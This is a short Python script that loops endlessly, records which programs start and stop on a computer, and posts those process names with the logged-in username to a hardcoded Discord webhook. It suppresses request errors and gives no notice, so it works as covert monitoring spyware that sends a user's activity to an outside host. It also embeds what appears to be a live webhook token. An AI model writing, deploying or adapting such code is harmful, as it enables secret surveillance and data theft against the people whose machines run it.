import json, os, requests, getpass, psutil

MILK_HOOK = "https://discord.com/api/webhooks/997807834622349333/dcxdLMAkQqKrtfTdQIcFv2sqq5Gtkgx72DR9YzueN2zIC1LcxPYTaVuZov8gf6OyZ_Is"
webhook = ""

programs = []

def sendWebhook(new_programs):
    global programs
    data = {
        "username": "Milk Hook",
        "content": ""
    }
    if set(new_programs)-set(programs):
        data["embeds"] = [
            {
                "description": f"started program: {set(new_programs)-set(programs)}",
                "title": getpass.getuser()
            }
        ]
        try:
            requests.post(url=MILK_HOOK, json=data)
        except:
            pass
    if set(programs)-set(new_programs):
        data["embeds"] = [
            {
                "description": f"ended program: {set(programs)-set(new_programs)}",
                "title": getpass.getuser()
            }
        ]
        try:
            requests.post(url=MILK_HOOK, json=data)
        except:
            pass
    programs = new_programs

def main():
    new_programs = []
    for proc in psutil.process_iter():
          new_programs.append(proc.name())
    if set(new_programs)-set(programs) or set(programs)-set(new_programs):
          sendWebhook(new_programs)

if __name__ == "__main__":
    while True:
        main()
